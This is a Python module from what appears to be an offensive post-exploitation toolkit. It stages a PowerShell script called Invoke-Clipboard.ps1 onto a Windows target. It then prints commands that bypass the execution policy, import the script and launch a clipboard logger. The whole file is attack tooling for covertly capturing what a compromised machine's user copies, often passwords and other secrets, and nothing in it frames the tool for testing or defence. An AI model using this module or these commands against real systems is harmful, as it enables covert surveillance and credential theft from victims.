from modules.upload.windows import stage_windows_files
from pathlib import Path


def run(data, cred, args):
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'


    BASE_DIR = Path(__file__).resolve().parents[2]

    files = [
        BASE_DIR / "tools" / "Invoke-Clipboard.ps1"
    ]


    try:
        stage_windows_files(files)
    except Exception as e:
        print(f"\n{R}[!] {W}{BOLD}STAGING FAILED{W}")
        print(f"{B}  └── {e}")
        return

    print(f"\n{B}┌── {BOLD}MODULE: CLIPBOARD MONITORING{W}{B} ─────────────────────┐{W}")
    print(f"{B}│{W}  {B}Tool:{W} Invoke-Clipboard.ps1                         {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    print(f"\n{G}[+] Commands:{W}\n")

    print(r"""
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Invoke-Clipboard.ps1
Invoke-ClipboardLogger
""")
